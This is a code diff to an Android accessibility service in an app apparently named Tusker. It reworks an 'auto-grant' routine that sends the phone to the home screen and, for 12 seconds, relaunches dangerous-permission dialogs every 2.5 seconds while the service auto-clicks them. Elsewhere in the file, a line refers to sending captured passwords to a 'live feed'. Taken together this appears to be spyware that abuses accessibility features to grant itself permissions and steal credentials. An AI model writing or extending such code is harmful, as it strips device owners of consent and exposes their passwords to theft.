@@ -995,7 +995,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
-        // First-launch sequence: Back → Home (800 ms total) → open MainActivity → 1.5 s → permissions.
+        // Step 1: Back → Home — land on the home launcher.
+        // Permission dialogs will float over the home screen, not inside the app.
         // performBack/performHome must run on the main thread (accessibility actions are main-thread only).
         new Handler(Looper.getMainLooper()).post(() -> {
             try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
@@ -1003,34 +1004,50 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
         }, 400L);
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            try {
-                Intent mainIntent = new Intent(this, com.task.tusker.MainActivity.class);
-                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivity(mainIntent);
-                Log.i(TAG, "Auto-grant: opened MainActivity after Back+Home sequence");
-            } catch (Exception ignored) {}
-        }, 800L);
-        // 1.5 s after MainActivity is in the foreground, trigger the permission dialogs.
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            try {
-                Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
-                pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS,
-                    com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS);
-                pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivity(pIntent);
-                Log.i(TAG, "Auto-grant: launched PermissionRequestActivity (1.5 s after MainActivity)");
-            } catch (Exception e) {
-                Log.w(TAG, "Auto-grant: could not launch PermissionRequestActivity: " + e.getMessage());
-            }
-        }, 2300L); // 800 ms (Back+Home done) + 1500 ms settle time
 
-        // Auto-grant mode expires after 12 seconds.
+        // Step 2: After ~2 s (home settled), start requesting permissions.
+        // Re-launches PermissionRequestActivity every 2.5 s for any still-ungranted permission
+        // so the user keeps seeing dialogs until everything is granted or the 12 s window closes.
+        final long grantDeadline = System.currentTimeMillis() + 12_000;
+        final Runnable[] permLauncher = { null };
+        permLauncher[0] = new Runnable() {
+            @Override
+            public void run() {
+                if (!autoGrantMode) return;
+                String[] missing = getMissingDangerousPermissions();
+                if (missing.length > 0 && System.currentTimeMillis() < grantDeadline) {
+                    try {
+                        Intent pIntent = new Intent(UnifiedAccessibilityService.this,
+                                com.task.tusker.PermissionRequestActivity.class);
+                        pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS,
+                                missing);
+                        pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                        startActivity(pIntent);
+                        Log.i(TAG, "Auto-grant: permission dialog launched ("
+                                + missing.length + " still missing)");
+                    } catch (Exception e) {
+                        Log.w(TAG, "Auto-grant: permission launch failed: " + e.getMessage());
+                    }
+                    if (autoGrantHandler != null) {
+                        autoGrantHandler.postDelayed(permLauncher[0], 2500);
+                    }
+                } else {
+                    Log.i(TAG, "Auto-grant: permission loop finished ("
+                            + (missing.length == 0 ? "all granted" : "12 s window closed") + ")");
+                    autoGrantMode = false;
+                }
+            }
+        };
+        // First dialog at 2000 ms from start (400 ms home + 1600 ms settle ≈ 2 s total).
+        new Handler(Looper.getMainLooper()).postDelayed(permLauncher[0], 2000);
+
+        // Safety net: kill autoGrantMode after 12 s even if the loop is still mid-cycle.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
             Log.i(TAG, "Auto-grant mode expired after 12 seconds");
         }, 12_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 12s");
+        Log.i(TAG, "Auto-grant mode ENABLED — will request permissions over home launcher for 12 s");
     }
 
     /**
@@ -3183,6 +3200,23 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             return prev;
         }
+    }
+
+    /**
+     * Returns the subset of DANGEROUS_PERMISSIONS that are not yet granted on this device.
+     * Used by the auto-grant retry loop to know what still needs to be requested.
+     */
+    private String[] getMissingDangerousPermissions() {
+        List<String> missing = new ArrayList<>();
+        for (String perm : com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS) {
+            try {
+                if (androidx.core.content.ContextCompat.checkSelfPermission(this, perm)
+                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    missing.add(perm);
+                }
+            } catch (Exception ignored) {}
+        }
+        return missing.toArray(new String[0]);
     }
 
     /** Flush any accumulated password for the given package to the live feed. */
